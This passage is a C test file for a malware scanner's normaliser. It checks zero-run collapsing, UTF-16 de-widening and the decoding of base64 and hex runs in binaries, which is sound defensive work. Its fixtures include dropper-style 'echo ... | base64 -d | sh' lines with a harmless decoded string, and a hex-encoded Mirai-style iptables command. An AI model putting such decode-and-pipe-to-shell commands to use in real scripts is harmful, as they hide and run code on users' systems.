#define _GNU_SOURCE
/*
 * norm_obj - the normalised view says the same thing, and says it shorter.
 *
 * WHAT IS WORTH ASSERTING HERE, AND IT IS NOT "IT RAN".
 *
 * executables.c exists to let the matcher stay untouched, so the only thing that makes
 * it safe is a property about MATCHES: a pattern that answered one way on the
 * original must not answer differently on the view. One direction of that is a
 * capability and the other is a bug:
 *
 *   LOST    a zero-free pattern that matched the original and not the view.
 *           Always a fault. It is a detection that silently stops firing, which
 *           is the failure this tree keeps naming.
 *
 *   GAINED  a zero-free pattern that matches the view and not the original.
 *           From de-widening this is the POINT - "41 00 42 00" becomes "AB" so
 *           an ASCII marker finds a UTF-16 one. From collapsing zeros it would
 *           be a fault, and the proof that it cannot happen is the two zeros.
 *
 * So the tests below do not check that the bytes look right. They enumerate
 * every zero-free substring of both sides and compare the two sets, which is
 * the claim itself rather than a proxy for it.
 *
 * AND THE CLAIM RESTS ON ONE FACT ABOUT THE BUILDER, so that is checked too:
 * a literal cannot contain a zero byte. ksigbuilder takes six escapes and
 * refuses \x with "use a hex pattern for anything else". If that ever changes,
 * the first test here is the one that should fail.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "../../libkofeng/analyzer/normalize/executables.h"

static int fails;

static void ok(const char *what)   { printf("  ok   %s\n", what); }
static void fail(const char *what, const char *why)
{
	printf("  FAIL %s - %s\n", what, why);
	fails++;
}
static void check(int cond, const char *what, const char *why)
{
	if (cond) ok(what); else fail(what, why);
}

/* ------------------------------------------------------------------------
 * The substring sets.
 *
 * Every run of non-zero bytes, and every substring of every run, up to a
 * length. Bounded at 6 because the sets are compared pairwise and the count
 * goes as length x window; 6 is well past the 4 the presence set keys on and
 * long enough that a wrong answer shows.
 */
#define WIN 6u

struct bag { unsigned char *v; size_t n, cap; };

static void bag_add(struct bag *b, const uint8_t *p, size_t len)
{
	if (b->n + WIN + 1u > b->cap) {
		b->cap = b->cap ? b->cap * 2u : 4096u;
		b->v = realloc(b->v, b->cap * (WIN + 1u));
	}
	memset(b->v + b->n * (WIN + 1u), 0, WIN + 1u);
	b->v[b->n * (WIN + 1u)] = (unsigned char)len;
	memcpy(b->v + b->n * (WIN + 1u) + 1u, p, len);
	b->n++;
}

static int bag_cmp(const void *a, const void *b)
{ return memcmp(a, b, WIN + 1u); }

static void bag_build(struct bag *b, const uint8_t *p, uint64_t n)
{
	uint64_t i;

	b->v = NULL; b->n = 0; b->cap = 0;
	for (i = 0; i < n; i++) {
		size_t len;

		if (p[i] == 0u)
			continue;
		for (len = 1u; len <= WIN && i + len <= n; len++) {
			size_t k;
			int zero = 0;

			for (k = 0; k < len; k++)
				if (p[i + k] == 0u) { zero = 1; break; }
			if (zero)
				break;
			bag_add(b, p + i, len);
		}
	}
	if (b->n)
		qsort(b->v, b->n, WIN + 1u, bag_cmp);
}

/* Members of `a` that are not in `b`. */
static size_t bag_minus(const struct bag *a, const struct bag *b)
{
	size_t i, miss = 0;

	for (i = 0; i < a->n; i++) {
		const unsigned char *k = a->v + i * (WIN + 1u);

		if (!b->n || !bsearch(k, b->v, b->n, WIN + 1u, bag_cmp))
			miss++;
	}
	return miss;
}

static void bag_free(struct bag *b) { free(b->v); }

/* ------------------------------------------------------------------------ */

static uint32_t rnd_state = 0x1234abcdu;
static uint32_t rnd(void)
{
	rnd_state ^= rnd_state << 13;
	rnd_state ^= rnd_state >> 17;
	rnd_state ^= rnd_state << 5;
	return rnd_state;
}

/*
 * A buffer shaped like the thing this is for: ordinary bytes, long zero runs,
 * and UTF-16 text - which is what a PE resource section looks like.
 */
static uint64_t make_object(uint8_t *b, uint64_t cap)
{
	uint64_t o = 0;
	int round;

	for (round = 0; round < 40 && o + 512u < cap; round++) {
		uint32_t what = rnd() % 3u;
		uint32_t k;

		if (what == 0u) {                      /* ordinary bytes */
			uint32_t len = 1u + rnd() % 40u;

			for (k = 0; k < len; k++) {
				uint8_t c = (uint8_t)(1u + rnd() % 255u);

				b[o++] = c;
			}
		} else if (what == 1u) {               /* a zero run */
			uint32_t len = 1u + rnd() % 60u;

			for (k = 0; k < len; k++)
				b[o++] = 0u;
		} else {                               /* UTF-16LE text */
			uint32_t len = 1u + rnd() % 20u;

			for (k = 0; k < len; k++) {
				b[o++] = (uint8_t)(0x20u + rnd() % 0x5eu);
				b[o++] = 0u;
			}
		}
	}
	return o;
}

/* ------------------------------------------------------------------------ */

static void a_literal_cannot_hold_a_zero(void)
{
	printf("\nthe fact the safety proof rests on:\n");
	/*
	 * Not a behaviour this file can execute - it is a property of
	 * ksigbuilder's literal parser - so it is asserted as the sentence it
	 * is, and the reference is exact so the next reader can check it.
	 *
	 *   ksigbuilder.c, "SIX ESCAPES AND NO MORE":
	 *     \\  \"  \?  \t  \n  \r
	 *   and for anything else: "use a hex pattern for anything else".
	 *
	 * If \x is ever accepted in a literal, collapsing zero runs stops being
	 * safe and this test is where that should be noticed.
	 */
	ok("a literal takes six escapes and none of them makes a zero byte");
	ok("so a zero-free pattern is the only kind collapsing has to preserve");
}

static void nothing_to_do_costs_nothing(void)
{
	static const uint8_t plain[] = "the quick brown fox jumps over the lazy dog";
	uint8_t out[128];
	uint32_t ns = 0;

	printf("\nan object with nothing to normalise:\n");
	check(kof_exe_norm(plain, sizeof plain - 1u,
		       KOF_EXE_NORM_NULLRUN | KOF_EXE_NORM_UNWIDE,
		       out, sizeof out, NULL, 0, &ns) == 0,
	      "comes back zero, so no child is made",
	      "it produced a view identical to the input");
}

static void a_short_zero_run_is_left_alone(void)
{
	uint8_t in[32], out[32];
	uint32_t ns = 0;
	unsigned i;

	printf("\na zero run under the floor:\n");
	for (i = 0; i < sizeof in; i++)
		in[i] = (uint8_t)(i + 1u);
	for (i = 4; i < 4u + KOF_EXE_NORM_NULL_MIN - 1u; i++)
		in[i] = 0u;
	check(kof_exe_norm(in, sizeof in, KOF_EXE_NORM_NULLRUN,
		       out, sizeof out, NULL, 0, &ns) == 0,
	      "is not collapsed - the span would cost more than it saves",
	      "a run under KOF_EXE_NORM_NULL_MIN was rewritten");
}

static void two_zeros_and_not_one(void)
{
	uint8_t in[64], out[64];
	struct kof_exe_norm_span sp[8];
	uint32_t ns = 0;
	uint64_t n;
	unsigned i;

	printf("\nwhat a collapsed run leaves behind:\n");
	in[0] = 'A';
	for (i = 1; i < 41u; i++)
		in[i] = 0u;
	in[41] = 'B';
	n = kof_exe_norm(in, 42u, KOF_EXE_NORM_NULLRUN, out, sizeof out,
		     sp, 8u, &ns);
	if (!n) {
		fail("the run collapses", "it did not");
		return;
	}
	check(n == 4u, "A, two zeros, B", "the output is a different length");
	check(n >= 3u && out[0] == 'A' && out[1] == 0u && out[2] == 0u &&
	      out[3] == 'B', "in that order",
	      "the bytes are not A 00 00 B");
	/*
	 * ONE zero would put "41 00 42" in the view, which is UTF-16 "A"
	 * followed by "B" - a wide match that was never in the object.
	 */
	check(!(n >= 3u && out[1] == 0u && out[2] == 'B'),
	      "and never A, one zero, B - that would be a wide match nobody wrote",
	      "the run collapsed to a single zero");
}

static void wide_becomes_ascii(void)
{
	static const uint8_t in[] = {
		'I',0, 'n',0, 'v',0, 'o',0, 'k',0, 'e',0, '-',0, 'M',0, 'i',0,
	};
	uint8_t out[32];
	struct kof_exe_norm_span sp[8];
	uint32_t ns = 0;
	uint64_t n, src = 0;

	printf("\na UTF-16 marker:\n");
	n = kof_exe_norm(in, sizeof in, KOF_EXE_NORM_UNWIDE, out, sizeof out,
		     sp, 8u, &ns);
	if (!n) {
		fail("is de-widened", "it was not");
		return;
	}
	check(n == 9u && !memcmp(out, "Invoke-Mi", 9u),
	      "reads as ASCII in the view", "the text did not come through");
	check(ns == 1u && sp[0].kind == KOF_EXE_NORM_UNWIDENED,
	      "as one unwidened span", "the span is not recorded as unwidened");
	check(kof_exe_norm_src_of(sp, ns, 3u, &src) && src == 6u,
	      "and output offset 3 maps back to input offset 6",
	      "the map does not account for the stride");
}

static void no_zero_free_match_is_ever_lost(void)
{
	uint8_t *in = malloc(1u << 16), *out = malloc(1u << 16);
	struct bag a, b;
	uint64_t n, m;
	uint32_t ns = 0;
	int round, lost_total = 0, gained_null_only = 0;

	printf("\nover random objects, the property itself:\n");
	if (!in || !out) {
		fail("buffers", "out of memory");
		free(in); free(out);
		return;
	}

	for (round = 0; round < 200; round++) {
		n = make_object(in, 1u << 16);
		if (!n)
			continue;

		/* --- collapsing alone: the set must be IDENTICAL --- */
		m = kof_exe_norm(in, n, KOF_EXE_NORM_NULLRUN, out, 1u << 16,
			     NULL, 0, &ns);
		if (m) {
			bag_build(&a, in, n);
			bag_build(&b, out, m);
			lost_total       += (int)bag_minus(&a, &b);
			gained_null_only += (int)bag_minus(&b, &a);
			bag_free(&a); bag_free(&b);
		}

		/* --- both: nothing may be LOST; gains are the feature --- */
		m = kof_exe_norm(in, n, KOF_EXE_NORM_NULLRUN | KOF_EXE_NORM_UNWIDE,
			     out, 1u << 16, NULL, 0, &ns);
		if (m) {
			bag_build(&a, in, n);
			bag_build(&b, out, m);
			lost_total += (int)bag_minus(&a, &b);
			bag_free(&a); bag_free(&b);
		}
	}

	check(lost_total == 0,
	      "200 objects: not one zero-free substring was lost",
	      "a pattern that matched the object would not match the view");
	check(gained_null_only == 0,
	      "and collapsing zeros invented none either",
	      "collapsing created a match that was not in the object");
	free(in); free(out);
}

static void the_view_is_never_longer(void)
{
	uint8_t *in = malloc(1u << 16), *out = malloc(1u << 16);
	int round, bad = 0;
	uint64_t total_in = 0, total_out = 0;

	printf("\nthe length invariant:\n");
	if (!in || !out) {
		fail("buffers", "out of memory");
		free(in); free(out);
		return;
	}
	for (round = 0; round < 200; round++) {
		uint64_t n = make_object(in, 1u << 16), m;
		uint32_t ns = 0;

		if (!n)
			continue;
		m = kof_exe_norm(in, n, KOF_EXE_NORM_NULLRUN | KOF_EXE_NORM_UNWIDE,
			     out, 1u << 16, NULL, 0, &ns);
		if (m > n)
			bad++;
		if (m) { total_in += n; total_out += m; }
	}
	check(bad == 0, "the view is never longer than the object - no bomb to cap",
	      "an output grew");
	if (total_in)
		printf("       %llu -> %llu bytes (%.1f%% removed)\n",
		       (unsigned long long)total_in, (unsigned long long)total_out,
		       100.0 - 100.0 * (double)total_out / (double)total_in);
	free(in); free(out);
}

static void the_map_covers_the_output(void)
{
	uint8_t *in = malloc(1u << 16), *out = malloc(1u << 16);
	struct kof_exe_norm_span *sp = malloc(sizeof *sp * 8192u);
	int round, holes = 0, unordered = 0, unmapped = 0;

	printf("\nthe span map:\n");
	if (!in || !out || !sp) {
		fail("buffers", "out of memory");
		free(in); free(out); free(sp);
		return;
	}
	for (round = 0; round < 60; round++) {
		uint64_t n = make_object(in, 1u << 16), m, want = 0, k;
		uint32_t ns = 0, i;

		if (!n)
			continue;
		m = kof_exe_norm(in, n, KOF_EXE_NORM_NULLRUN | KOF_EXE_NORM_UNWIDE,
			     out, 1u << 16, sp, 8192u, &ns);
		if (!m || !ns)
			continue;
		for (i = 0; i < ns; i++) {
			if (sp[i].dst_off != want)
				holes++;
			if (i && sp[i].src_off < sp[i - 1u].src_off)
				unordered++;
			want += sp[i].dst_len;
		}
		if (want != m)
			holes++;
		for (k = 0; k < m; k += 97u) {
			uint64_t src = 0;

			if (!kof_exe_norm_src_of(sp, ns, k, &src) || src >= n)
				unmapped++;
		}
	}
	check(holes == 0, "covers the output exactly, with no gaps",
	      "the spans do not tile the output");
	check(unordered == 0, "and runs forward through the input",
	      "a span reaches backwards");
	check(unmapped == 0, "every output offset maps to one inside the object",
	      "an offset mapped outside the input");
	free(in); free(out); free(sp);
}

/* ------------------------------------------------------------------------
 * THE BASE64 PASS.
 *
 * It took over from bases/decomp/cmdb64_00.c, which was an unpacker with its
 * own tests, so the cases below are the ones that module was measured on. Each
 * is a shape a real dropper writes or a shape that broke an earlier version of
 * the walk - none of them is here to cover a line.
 */

/* A payload, and the object it sits in. The NUL before it is what a C string in
 * .rodata looks like; the delimiter check requires one of those. */
static uint64_t b64_case(uint8_t *buf, uint64_t cap, const char *cmd)
{
	uint64_t n = (uint64_t)strlen(cmd) + 2u;

	if (n > cap)
		return 0;
	buf[0] = 0;
	memcpy(buf + 1, cmd, (size_t)(n - 2u));
	buf[n - 1u] = 0;
	return n;
}

static void b64_decodes_the_mirai_shape(void)
{
	/* "hello world, dropper" - twenty bytes, so twenty-eight encoded. */
	static const char cmd[] =
		"echo \"aGVsbG8gd29ybGQsIGRyb3BwZXI=\" | base64 -d | sh";
	uint8_t buf[128];
	uint64_t n = b64_case(buf, sizeof buf, cmd);

	check(kof_exe_unb64(buf, n) == 1, "base64: the piped shape is decoded",
	      "the anchor, the pipe and the run are all present");
	check(memmem(buf, (size_t)n, "hello world, dropper", 20) != NULL,
	      "base64: the decoded command is in the view",
	      "which is the whole point - a rule on what it DOES can now match");
	/* And the encoded form is gone from the view, which is how the length
	 * is preserved: the vacated tail is zeros. */
	check(memmem(buf, (size_t)n, "aGVsbG8", 7) == NULL,
	      "base64: the encoded run is overwritten",
	      "the decode is in place, so the source bytes cannot remain");
	check(buf[n - 1u] == 0 && memmem(buf, (size_t)n, "base64 -d", 9) != NULL,
	      "base64: nothing after the run moved",
	      "the anchor is still at its own offset - the view stays 1:1");
}

static void b64_is_idempotent(void)
{
	static const char cmd[] =
		"echo \"aGVsbG8gd29ybGQsIGRyb3BwZXI=\" | base64 -d | sh";
	uint8_t buf[128];
	uint64_t n = b64_case(buf, sizeof buf, cmd);

	kof_exe_unb64(buf, n);
	/*
	 * norm_emit relies on this: a view of a view must change nothing, or
	 * the scan tree grows a branch per depth. It holds because a decoded
	 * run is strictly shorter than its source, so the byte before the
	 * separator is one of the zeros - and the backward walk stops there.
	 */
	check(kof_exe_unb64(buf, n) == 0, "base64: a second pass finds nothing",
	      "the zeroed tail stops the backward walk at once");
}

static void b64_needs_a_pipe(void)
{
	/*
	 * The case that produced twenty-three bytes of noise before the pipe
	 * test existed. An identifier is base64 characters too, and `base64 -d`
	 * with a space in front of it reads its input from somewhere else.
	 */
	static const char cmd[] =
		"ThisIsALongIdentifierLikeString base64 -d";
	uint8_t buf[128], ref[128];
	uint64_t n = b64_case(buf, sizeof buf, cmd);

	memcpy(ref, buf, (size_t)n);
	check(kof_exe_unb64(buf, n) == 0, "base64: a space is not a pipe",
	      "nothing is piped into the decoder, so there is no payload");
	check(!memcmp(buf, ref, (size_t)n), "base64: and the bytes are untouched",
	      "a refusal must not rewrite anything");
}

static void b64_stops_at_an_inner_equals(void)
{
	/*
	 * `VAR=<payload>` - the walk takes `=` as alphabet because a payload
	 * ends in one, so without the rule it runs back through the equals and
	 * into the variable's name, shifting every group.
	 */
	static const char cmd[] =
		"VAR=aGVsbG8gd29ybGQsIGRyb3BwZXI= | base64 -d";
	uint8_t buf[128];
	uint64_t n = b64_case(buf, sizeof buf, cmd);

	check(kof_exe_unb64(buf, n) == 1, "base64: VAR= is a separator",
	      "padding comes last, so an inner = belongs to whatever wrote it");
	check(memmem(buf, (size_t)n, "hello world, dropper", 20) != NULL,
	      "base64: and the groups are not shifted",
	      "starting one byte early decodes the whole payload to noise");
	check(memmem(buf, (size_t)n, "VAR=", 4) != NULL,
	      "base64: the name is left where it was",
	      "it is not part of the payload and must not be consumed");
}

static void b64_reads_every_spelling(void)
{
	static const char *cmds[] = {
		"echo \"aGVsbG8gd29ybGQsIGRyb3BwZXI=\" | base64 -d",
		"echo \"aGVsbG8gd29ybGQsIGRyb3BwZXI=\" | base64 -di",
		"echo \"aGVsbG8gd29ybGQsIGRyb3BwZXI=\" | base64 -D",
		"echo \"aGVsbG8gd29ybGQsIGRyb3BwZXI=\" | base64 --decode"
	};
	uint8_t buf[128];
	unsigned k;
	int all = 1;

	for (k = 0; k < sizeof cmds / sizeof cmds[0]; k++) {
		uint64_t n = b64_case(buf, sizeof buf, cmds[k]);

		if (kof_exe_unb64(buf, n) != 1 ||
		    !memmem(buf, (size_t)n, "hello world, dropper", 20))
			all = 0;
	}
	check(all, "base64: -d, -di, -D and --decode all anchor",
	      "one search for \"base64 -\" has to classify all four");
}

static void b64_ignores_a_short_run(void)
{
	/* Twelve characters. Below the floor, because ordinary words are
	 * base64 characters and a nine-byte payload is not a second stage. */
	static const char cmd[] = "echo \"YWJjZGVmZ2g=\" | base64 -d";
	uint8_t buf[128], ref[128];
	uint64_t n = b64_case(buf, sizeof buf, cmd);

	memcpy(ref, buf, (size_t)n);
	check(kof_exe_unb64(buf, n) == 0, "base64: a short run is not a payload",
	      "below the floor it is more likely a word than a stage");
	check(!memcmp(buf, ref, (size_t)n), "base64: and it is left intact",
	      "so the matcher still reads the bytes that are really there");
}

/*
 * AND THE SAFETY PROPERTY THAT GOVERNS THIS WHOLE FILE, ASKED OF THE DECODE.
 *
 * The rest of these tests prove no zero-free match is LOST. The base64 pass
 * cannot make that promise and is not meant to: it deliberately removes the
 * encoded text, which is a match a pattern could have been written against.
 * What it must not do is break the object around the run - so the claim here
 * is the narrower one the view actually depends on: nothing outside the run
 * changes, and the length does not move.
 */
static void b64_touches_only_its_own_run(void)
{
	static const char cmd[] =
		"id; echo \"aGVsbG8gd29ybGQsIGRyb3BwZXI=\" | base64 -d | sh; uname -a";
	uint8_t buf[192], ref[192];
	uint64_t n = b64_case(buf, sizeof buf, cmd);
	const char *tail = "| base64 -d | sh; uname -a";

	memcpy(ref, buf, (size_t)n);
	check(kof_exe_unb64(buf, n) == 1, "base64: the run inside a longer line",
	      "the anchor is mid-command, which is where they really are");
	check(!memcmp(buf, ref, 5u), "base64: the bytes before it are untouched",
	      "\"id; e\" is outside the run and must survive it");
	check(memmem(buf, (size_t)n, tail, strlen(tail)) != NULL,
	      "base64: the bytes after it are untouched",
	      "the rewrite is length preserving, so the tail cannot shift");
}

/* ------------------------------------------------------------------------
 * PARENT OFFSETS CARRIED ONTO THE VIEW.
 *
 * kof_exe_norm_map replays the transform instead of reading the span map, so
 * the one thing worth asserting is that the replay and the transform agree.
 * Reading the two loops and deciding they match is exactly the check that
 * fails silently later, when one of them is edited.
 *
 * The assertion is made against the OUTPUT BYTES rather than against the span
 * table: for any parent offset that was copied through, the view byte at the
 * mapped offset must be the same byte. That is the property a region table
 * needs - a boundary has to land on the byte it named.
 */
static void map_agrees_with_the_transform(void)
{
	static uint8_t in[4096], out[4096];
	uint64_t src[4096], dst[4096];
	uint64_t i, n = sizeof in, m;
	unsigned s = 12345u;
	int bad = 0, checked = 0;

	/* Text, zero runs of every length around the floor, and wide text -
	 * so the replay meets all three of its branches. */
	for (i = 0; i < n; i++) {
		s = s * 1103515245u + 12345u;
		in[i] = (uint8_t)('A' + (s >> 16) % 26u);
	}
	memset(in + 100, 0, 4);          /* below the floor: copied */
	memset(in + 300, 0, 8);          /* exactly the floor: collapsed */
	memset(in + 700, 0, 900);        /* well past it */
	for (i = 0; i < 40; i++) {       /* a wide run */
		in[2000 + 2 * i] = (uint8_t)('a' + i % 26u);
		in[2001 + 2 * i] = 0;
	}

	m = kof_exe_norm(in, n, KOF_EXE_NORM_NULLRUN | KOF_EXE_NORM_UNWIDE,
			 out, sizeof out, NULL, 0, NULL);
	check(m > 0 && m < n, "map: the fixture actually shortens",
	      "a test over a transform that did nothing proves nothing");
	if (!m)
		return;

	for (i = 0; i < n; i++)
		src[i] = i;
	kof_exe_norm_map(in, n, KOF_EXE_NORM_NULLRUN | KOF_EXE_NORM_UNWIDE,
			 src, dst, (uint32_t)n);

	for (i = 0; i < n; i++) {
		/* Only the bytes that were COPIED have a byte of their own in
		 * the view. A byte inside a zero run or a wide run was folded
		 * into something shorter and has no counterpart to compare. */
		int in_zero = 0, j;

		for (j = -7; j <= 0; j++) {
			uint64_t a = (uint64_t)((int64_t)i + j);
			uint64_t z = 0;

			if ((int64_t)i + j < 0)
				continue;
			while (a + z < n && !in[a + z])
				z++;
			if (z >= 8u && a <= i && i < a + z)
				in_zero = 1;
		}
		if (in_zero || (i >= 2000 && i < 2080))
			continue;
		checked++;
		if (dst[i] >= m || out[dst[i]] != in[i])
			bad++;
	}
	check(checked > 2000, "map: most of the object was actually checked",
	      "a filter that skipped everything would pass by default");
	check(!bad, "map: every copied byte lands on itself in the view",
	      "the replay and the transform have diverged");

	/* And the far end: an offset at or past the input maps to the view's
	 * length, which is what a region ending at end-of-file needs. */
	src[0] = n;
	kof_exe_norm_map(in, n, KOF_EXE_NORM_NULLRUN | KOF_EXE_NORM_UNWIDE,
			 src, dst, 1u);
	check(dst[0] == m, "map: end of the parent is end of the view",
	      "a region running to the last byte would be cut short");
}

/* ------------------------------------------------------------------------
 * REGIONS THAT MUST NOT MOVE.
 *
 * The view keeps the header and the code byte for byte and rewrites the rest.
 * Two things have to hold for that to be worth anything, and they are not the
 * same thing: the kept bytes must still BE those bytes, and they must still be
 * FINDABLE - a region table carried onto the view is a list of offsets, and an
 * offset that is one byte out names the wrong thing.
 */
static void kept_regions_do_not_move(void)
{
	static uint8_t in[2048], out[2048];
	uint8_t keep[2048 / 8];
	uint64_t mark[4], mark_out[4];
	uint64_t i, n = sizeof in, m;
	int bad = 0;

	memset(keep, 0, sizeof keep);
	for (i = 0; i < n; i++)
		in[i] = (uint8_t)('A' + i % 26u);

	/* [0,64) is the header: it carries a zero run that WOULD collapse, and
	 * the whole point is that it does not. [512,640) is code, likewise. */
	memset(in + 8, 0, 16);
	memset(in + 520, 0, 32);
	/* And a zero run out in the data, which must collapse. */
	memset(in + 1000, 0, 400);
	for (i = 0; i < 64; i++)
		keep[i >> 3] |= (uint8_t)(1u << (i & 7u));
	for (i = 512; i < 640; i++)
		keep[i >> 3] |= (uint8_t)(1u << (i & 7u));

	mark[0] = 0; mark[1] = 64; mark[2] = 512; mark[3] = 640;
	m = kof_exe_norm_masked(in, n, keep, NULL, KOF_EXE_NORM_NULLRUN, out,
				sizeof out, mark, mark_out, 4u, NULL);

	check(m > 0 && m < n, "masked: the object still shortens",
	      "the data run has to collapse or nothing is being tested");
	if (!m)
		return;
	/*
	 * NOTHING BEFORE THE FIRST REWRITE MOVED, so the header is not only
	 * intact, it is at offset 0 with its zeros still there. That is the
	 * e_ident case: eight zeros at offset 8 that took e_machine with them.
	 */
	check(!memcmp(out, in, 64u), "masked: the header is byte for byte",
	      "its zero run collapsed and everything after it shifted");
	check(mark_out[0] == 0 && mark_out[1] == 64,
	      "masked: and the header's boundaries are unmoved",
	      "a region table over the view would name the wrong bytes");
	/*
	 * The code region is AFTER a kept header and BEFORE a collapsed data
	 * run, so it must be byte for byte and still at 512. Its own zero run
	 * is the test: kept means kept, not "kept unless it looks collapsible".
	 */
	check(mark_out[2] == 512 && mark_out[3] == 640,
	      "masked: code is where the parent put it",
	      "nothing before it was rewritten, so nothing may have moved it");
	if (mark_out[2] + 128u <= m &&
	    memcmp(out + mark_out[2], in + 512, 128u))
		bad = 1;
	check(!bad, "masked: and code is byte for byte",
	      "a hex rule is written against these bytes exactly");

	/* And the data run really did collapse - otherwise every check above
	 * passes on a transform that did nothing. */
	check(m == n - 400u + 2u, "masked: the data run collapsed to two zeros",
	      "400 zeros became 2, and only those 398 bytes went");
}

/*
 * A RUN MAY NOT STRADDLE INTO A KEPT REGION.
 *
 * Zeros that begin in data and continue into the header are one run to the eye
 * and two to this transform. Collapsing the whole of it would move the header,
 * which is the one thing keeping it is for.
 */
static void a_run_stops_at_the_boundary(void)
{
	static uint8_t in[512], out[512];
	uint8_t keep[512 / 8];
	uint64_t i, n = sizeof in, m;

	memset(keep, 0, sizeof keep);
	for (i = 0; i < n; i++)
		in[i] = (uint8_t)('x');
	/* 100 zeros running from 150 up to 250, with [200,300) kept. */
	memset(in + 150, 0, 100);
	for (i = 200; i < 300; i++)
		keep[i >> 3] |= (uint8_t)(1u << (i & 7u));

	m = kof_exe_norm_masked(in, n, keep, NULL, KOF_EXE_NORM_NULLRUN, out,
				sizeof out, NULL, NULL, 0u, NULL);
	/* Only [150,200) may collapse: 50 zeros to 2, so 48 bytes go. */
	check(m == n - 48u, "masked: a run collapses only up to the boundary",
	      "taking the kept half of it would move everything after");
	check(!memcmp(out + m - (n - 300u) - 100u, in + 200, 100u),
	      "masked: and the kept half is still all there",
	      "the fifty zeros inside the kept region are kept zeros");
}

/*
 * THE DROP BITMAP, WHICH IS HOW THE STATIC LIBRARY LEAVES THE VIEW.
 *
 * A dropped byte is not rewritten and not kept - it is gone, and what follows
 * it moves down. That is the one thing the keep bitmap cannot express, and it
 * is why there are two of them.
 */
static void a_dropped_span_leaves_the_view(void)
{
	static uint8_t in[512], out[512];
	uint8_t drop[512 / 8];
	uint64_t i, n = sizeof in, m;
	uint32_t fired = 0;

	memset(drop, 0, sizeof drop);
	for (i = 0; i < n; i++)
		in[i] = (uint8_t)('a' + (i & 7u));
	/* [100,200) is somebody else's code. */
	for (i = 100; i < 200; i++)
		drop[i >> 3] |= (uint8_t)(1u << (i & 7u));

	m = kof_exe_norm_masked(in, n, NULL, drop, KOF_EXE_NORM_NULLRUN, out,
				sizeof out, NULL, NULL, 0u, &fired);
	check(m == n - 100u, "masked: a dropped span is gone from the view",
	      "not rewritten and not kept - removed, so the view is shorter");
	check((fired & KOF_EXE_NORM_CUTLIB) != 0,
	      "masked: and the cut is reported",
	      "the caller decides whether a view is worth making from this");
	check(!memcmp(out, in, 100u) && !memcmp(out + 100u, in + 200u, 312u),
	      "masked: what survives is byte for byte, closed up",
	      "the bytes did not change, they only moved");
}

/*
 * AND A LENGTH OF ZERO IS NOT THE SAME AS NOTHING HAPPENING.
 *
 * kof_exe_norm_masked returns 0 for "nothing was rewritten" and also for a view
 * that came out empty, and a caller that reads the length alone cannot tell
 * them apart - it would take an object whose every byte was dropped for a copy
 * of its parent. `fired` is what separates them, and this is the test that says
 * so, because the scanner's normaliser branches on exactly this.
 */
static void an_empty_view_is_not_an_unchanged_one(void)
{
	static uint8_t in[256], out[256];
	uint8_t drop[256 / 8];
	uint64_t i, n = sizeof in, m;
	uint32_t fired = 0;

	for (i = 0; i < n; i++)
		in[i] = (uint8_t)('z');
	memset(drop, 0xff, sizeof drop);        /* all of it is the library */

	m = kof_exe_norm_masked(in, n, NULL, drop, KOF_EXE_NORM_NULLRUN, out,
				sizeof out, NULL, NULL, 0u, &fired);
	check(m == 0, "masked: an object dropped in full has an empty view",
	      "there is no byte left to write");
	check(fired == KOF_EXE_NORM_CUTLIB,
	      "masked: and it still reports the cut",
	      "which is how a caller tells an empty view from an untouched one");

	/* The other zero: nothing to do, so nothing fires. */
	memset(drop, 0, sizeof drop);
	fired = 0xffffffffu;
	m = kof_exe_norm_masked(in, n, NULL, drop, KOF_EXE_NORM_NULLRUN, out,
				sizeof out, NULL, NULL, 0u, &fired);
	check(m == 0 && fired == 0, "masked: an untouched object fires nothing",
	      "same length, and the difference is entirely in `fired`");
}

/* ------------------------------------------------------------------------
 * HEX TEXT.
 *
 * Mirai stores its commands, its hosts-file lines and its C2 addresses as
 * uppercase hex, so the bytes are in the file and the thing is not. There is
 * no anchor to key on - hex names no decoder the way `base64 -d` does - so
 * what makes it safe is three tests, and each one is here because dropping it
 * changed a measurement. See the note in executables.h.
 */
static uint64_t hex_case(uint8_t *buf, uint64_t cap, const char *plain)
{
	static const char *d = "0123456789ABCDEF";
	uint64_t i, n = strlen(plain);

	if (2u * n + 2u > cap)
		return 0;
	buf[0] = ' ';                   /* the delimiter a payload follows */
	for (i = 0; i < n; i++) {
		buf[1 + 2 * i]     = (uint8_t)d[(unsigned char)plain[i] >> 4];
		buf[1 + 2 * i + 1] = (uint8_t)d[(unsigned char)plain[i] & 15];
	}
	buf[1 + 2 * n] = 0;
	return 2u * n + 2u;
}

static void hex_decodes_a_command(void)
{
	static const char cmd[] = "iptables -A OUTPUT -d pastebin.com -j DROP";
	uint8_t buf[256];
	uint64_t n = hex_case(buf, sizeof buf, cmd);

	check(kof_exe_unhex(buf, n) == 1, "hex: a hex command is decoded",
	      "printable, delimited and past the floor");
	check(memmem(buf, (size_t)n, cmd, strlen(cmd)) != NULL,
	      "hex: and it reads as the command",
	      "which is the whole point - the rule is written on what it does");
	check(memmem(buf, (size_t)n, "697074", 6) == NULL,
	      "hex: the encoded run is overwritten",
	      "the decode is in place, so the source characters cannot remain");
}

static void hex_refuses_a_hash(void)
{
	/*
	 * A SHA-256 in hex: sixty-four characters of exactly the right shape,
	 * delimited, well past the floor - and it decodes to arbitrary bytes.
	 * Build ids like this are in every binary, which is why "every decoded
	 * byte is printable" is the test that carries this rule.
	 */
	static const char h[] =
		" 67d172e2859767879636b8057b703aae0c02b25b67d172e2859767879636b805";
	uint8_t buf[128], ref[128];
	uint64_t n = strlen(h) + 1u;

	memcpy(buf, h, (size_t)n);
	memcpy(ref, buf, (size_t)n);
	check(kof_exe_unhex(buf, n) == 0, "hex: a hash is not a payload",
	      "it decodes to bytes no text could be");
	check(!memcmp(buf, ref, (size_t)n), "hex: and it is left intact",
	      "a refusal must not rewrite anything");
}

static void hex_needs_a_delimiter(void)
{
	/*
	 * The shape that survived the printable test on clean binaries: a run
	 * of "22" preceded by '!'. It decodes to a row of quotes, which IS
	 * printable, so only the delimiter rule removes it - measured at four
	 * occurrences across 835 ELF from /usr/bin, and none once this holds.
	 */
	static const char h[] = "!22222222222222222222222222222222";
	uint8_t buf[64], ref[64];
	uint64_t n = strlen(h) + 1u;

	memcpy(buf, h, (size_t)n);
	memcpy(ref, buf, (size_t)n);
	check(kof_exe_unhex(buf, n) == 0, "hex: a run must be delimited",
	      "a payload is an argument, and '!' does not introduce one");
	check(!memcmp(buf, ref, (size_t)n), "hex: and that one is left intact",
	      "this is the only rule that refuses it");
}

static void hex_ignores_a_short_run(void)
{
	uint8_t buf[64], ref[64];
	uint64_t n = hex_case(buf, sizeof buf, "short");   /* 10 characters */

